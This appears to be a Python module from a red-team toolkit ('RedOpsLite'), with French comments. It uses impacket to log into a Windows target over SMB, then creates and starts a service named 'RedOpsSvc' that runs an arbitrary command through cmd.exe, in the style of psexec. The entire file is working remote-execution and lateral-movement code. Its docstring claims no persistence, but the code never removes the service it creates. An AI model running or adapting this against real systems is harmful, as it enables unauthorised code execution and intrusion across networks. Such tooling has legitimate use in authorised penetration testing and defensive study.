from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr
from core.utils import print_banner
def run(target, username, password, domain='', cmd="whoami"):
    """
    Établit une connexion SMB à la cible et exécute une commande via un service temporaire.
    Similaire à psexec mais en mode plus discret (pas de persistance).
    """
    print_banner("Module : SMB Remote Shell")
    try:
        # Connexion SMB à la cible
        smb = SMBConnection(target, target)
        smb.login(username, password, domain)

        # Préparation du canal DCE/RPC vers le gestionnaire de services Windows (SCM)
        rpc = transport.SMBTransport(target, 445, r'\svcctl', smb_connection=smb)
        dce = rpc.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        # Connexion au service manager
        resp = scmr.hROpenSCManagerW(dce)
        handle = resp['lpScHandle']

        try:
            # Création du service temporaire avec la commande
            scmr.hRCreateServiceW(
                dce, handle, 'RedOpsSvc', 'RedOpsLite Shell',
                lpBinaryPathName=f'cmd.exe /c {cmd}',
                dwStartType=scmr.SERVICE_DEMAND_START
            )
        except Exception:
            # Le service peut déjà exister : on l'utilise
            pass

        # Exécution du service (donc de la commande)
        svc = scmr.hROpenServiceW(dce, handle, 'RedOpsSvc')['lpServiceHandle']
        scmr.hRStartServiceW(dce, svc)

        print(f"[OK] Commande exécutée : {cmd}")
    except Exception as e:
        print(f"[ERREUR] Échec d'exécution : {e}")